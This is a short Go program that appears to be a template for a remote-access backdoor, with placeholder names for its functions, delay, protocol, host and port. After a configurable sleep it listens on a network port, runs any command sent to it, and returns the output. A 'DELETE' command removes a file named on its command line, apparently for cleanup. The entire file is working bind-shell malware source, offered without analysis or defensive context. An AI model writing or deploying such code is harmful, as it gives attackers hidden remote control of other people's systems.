package main
import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "strings"
    "time"
)

func FUNC_DELETE(){
    os.Remove(os.Args[1])
}

func FUNC_SLEEP(){
    time.Sleep(SECONDS*time.Second) 
}

func FUNC_HANDLE(conn net.Conn) {
    for {
        buffer := make([]byte, 1024)
        length, _ := conn.Read(buffer)
        command := string(buffer[:length-1])
        if command == "DELETE"{
            FUNC_DELETE()
        }
        parts := strings.Fields(command)
        head := parts[0]
        parts = parts[1:len(parts)]
        out, _ := exec.Command(head,parts...).Output()
        conn.Write(out)
    }
    conn.Close()
}

func main() {
    FUNC_SLEEP()
    listen, err := net.Listen("CONN_TYPE", "HOST:PORT")
    if err != nil {
        os.Exit(1)
    }
    defer listen.Close()
    for {
        conn, err := listen.Accept()
        if err != nil {
            os.Exit(1)
        }
        FUNC_HANDLE(conn)
    }
}
